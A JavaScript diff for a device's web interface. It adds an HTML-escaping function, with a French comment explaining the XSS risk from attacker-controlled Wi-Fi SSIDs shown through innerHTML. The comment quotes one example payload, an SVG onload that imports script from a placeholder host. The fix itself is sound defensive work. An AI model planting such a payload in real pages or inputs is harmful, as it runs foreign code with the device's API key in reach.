@@ -97,6 +97,27 @@ window.trOr = function(id, fallback) {
 window.escAttr = function(str) {
     return String(str).replace(/&/g, '&amp;').replace(/"/g, '&quot;');
 };
+// Échappe une chaîne pour un usage sûr dans du HTML construit par template littéral, que ce soit
+// comme TEXTE ou comme valeur d'attribut entre guillemets. À appliquer à TOUTE donnée qui ne vient
+// pas des locales : noms d'équipement/pièce/groupe, SSID et BSSID relevés au scan, noms de release
+// GitHub, nom d'hôte.
+//
+// POURQUOI. Il n'existait aucun assainisseur de ce genre dans le front-end, et une bonne trentaine
+// de sites injectaient ces valeurs telles quelles via innerHTML. Le vecteur le plus sérieux n'est
+// pas le nom d'un volet (il faut déjà être authentifié pour le poser) mais le SSID : c'est une
+// chaîne de 32 octets entièrement contrôlée par un TIERS -- n'importe quel point d'accès à portée --
+// affichée dès qu'on ouvre l'écran Wi-Fi. `<svg onload=import('//x.yz')>` y tient. La CSP du
+// document autorise script-src 'unsafe-inline' (elle doit couvrir les onclick= et le script de
+// thème), elle ne bloque donc rien ici, et le code s'exécuterait dans l'origine du boîtier avec
+// security.apiKey à portée.
+//
+// ATTENTION AU CHEMIN RETOUR : partout où une valeur échappée est ensuite RELUE depuis le DOM,
+// lire .textContent et non .innerHTML -- ce dernier rendrait l'entité (`&amp;`) au lieu du
+// caractère, et un SSID contenant `&` deviendrait irrejoignable (cf. Wifi.selectSSID).
+window.escHtml = function(str) {
+    return String(str ?? '').replace(/[&<>"']/g, c =>
+        ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);
+};
 const translator = {
     isInitialized: false,
     observer: null,
